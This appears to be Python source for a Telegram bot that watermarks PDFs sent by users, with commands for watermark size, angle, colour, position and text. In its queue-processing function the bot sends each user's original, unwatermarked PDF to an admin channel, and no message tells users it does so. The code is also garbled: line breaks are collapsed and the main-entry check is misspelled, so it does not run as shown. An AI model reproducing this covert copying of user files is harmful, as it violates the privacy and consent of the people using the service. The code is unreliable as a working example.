import os import tempfile import asyncio from queue import Queue from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup from telegram.ext import (ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters, ConversationHandler) from PyPDF2 import PdfReader, PdfWriter from reportlab.pdfgen import canvas from reportlab.lib.pagesizes import letter from reportlab.lib.colors import HexColor

BOT_TOKEN = os.getenv("BOT_TOKEN") ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID") # e.g. '@my_admin_channel'

WAITING_PDF, SET_WATERMARK_TEXT = range(2)

user_configs = {} # Stores user watermark settings user_queues = {} # Stores user's PDF processing queue

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.message.reply_text("Send me one or more PDF documents. Type /setwatermark to configure your watermark settings.") return WAITING_PDF

async def setwatermark(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id args = context.args

if len(args) < 5: await update.message.reply_text("Usage: /setwatermark <size> <angle> <color> <position> <darkness (0-1)>") return ConversationHandler.END size, angle, color, position, darkness = args user_configs[user_id] = { "size": int(size), "angle": int(angle), "color": color, "position": position, "darkness": float(darkness), } await update.message.reply_text("Watermark settings saved! Now send your watermark text using /settext <your text>.") return ConversationHandler.END 

async def settext(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id text = ' '.join(context.args) if user_id not in user_configs: user_configs[user_id] = {} user_configs[user_id]['text'] = text await update.message.reply_text("Watermark text saved! Send your PDFs now.") return WAITING_PDF

async def receive_pdf(update: Update, context: ContextTypes.DEFAULT_TYPE): user_id = update.message.from_user.id if user_id not in user_configs or 'text' not in user_configs[user_id]: await update.message.reply_text("Please configure watermark first using /setwatermark and /settext.") return WAITING_PDF

if user_id not in user_queues: user_queues[user_id] = Queue() asyncio.create_task(process_user_queue(user_id, context)) file = update.message.document if not file.mime_type.endswith("pdf"): await update.message.reply_text("Please send a PDF file.") return WAITING_PDF user_queues[user_id].put(file) await update.message.reply_text("File added to your processing queue.") return WAITING_PDF 

async def process_user_queue(user_id, context: ContextTypes.DEFAULT_TYPE): while not user_queues[user_id].empty(): file = user_queues[user_id].get() data = user_configs[user_id]

tg_file = await file.get_file() with tempfile.NamedTemporaryFile(delete=False, suffix=".pdf") as tf: await tg_file.download_to_drive(custom_path=tf.name) original_path = tf.name await context.bot.send_document(chat_id=ADMIN_CHANNEL_ID, document=open(original_path, 'rb'), caption="Original file") with tempfile.NamedTemporaryFile(delete=False, suffix=".pdf") as wf: create_watermark_pdf( data['text'], wf.name, color=data.get("color", "#000000"), size=int(data.get("size", 20)), position=data.get("position", "center"), angle=int(data.get("angle", 45)), opacity=float(data.get("darkness", 0.2)) ) watermark_path = wf.name with tempfile.NamedTemporaryFile(delete=False, suffix=".pdf") as output: apply_watermark(original_path, watermark_path, output.name) await context.bot.send_document(chat_id=user_id, document=open(output.name, 'rb')) del user_queues[user_id] 

def create_watermark_pdf(text, output_path, color, size, position, angle, opacity): from reportlab.pdfbase import pdfmetrics from reportlab.pdfbase.ttfonts import TTFont from reportlab.lib.colors import Color

c = canvas.Canvas(output_path, pagesize=letter) c.setFont("Helvetica", size) r, g, b = HexColor(color).red, HexColor(color).green, HexColor(color).blue c.setFillColor(Color(r, g, b, alpha=opacity)) width, height = letter if position == "top-left": x, y = 100, height - 100 elif position == "center": x, y = width / 2, height / 2 elif position == "bottom-right": x, y = width - 100, 100 else: x, y = 300, 400 c.saveState() c.translate(x, y) c.rotate(angle) c.drawCentredString(0, 0, text) c.restoreState() c.save() 

def apply_watermark(input_pdf, watermark_pdf, output_pdf): watermark = PdfReader(watermark_pdf).pages[0] reader = PdfReader(input_pdf) writer = PdfWriter()

for page in reader.pages: page.merge_page(watermark) writer.add_page(page) with open(output_pdf, "wb") as f: writer.write(f) 

if name == "main": app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start)) app.add_handler(CommandHandler("setwatermark", setwatermark)) app.add_handler(CommandHandler("settext", settext)) app.add_handler(MessageHandler(filters.Document.PDF, receive_pdf)) print("Bot running...") app.run_webhook( listen="0.0.0.0", port=int(os.environ.get("PORT", 8443)), webhook_url=os.environ["RENDER_EXTERNAL_URL"] + "/webhook" ) 
